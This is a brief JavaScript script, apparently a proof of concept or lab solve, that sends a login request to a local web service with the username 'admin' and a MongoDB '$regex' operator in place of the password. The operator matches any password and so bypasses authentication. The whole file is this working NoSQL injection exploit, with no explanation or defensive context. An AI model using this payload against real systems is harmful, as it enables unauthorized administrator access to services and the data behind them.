const url = process.env.CONNECT || "http://localhost:3000";

const body = {
  username: "admin",
  password: { $regex: ".*" },
};

const res = await fetch(`${url}/`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify(body),
});

console.log(await res.text());
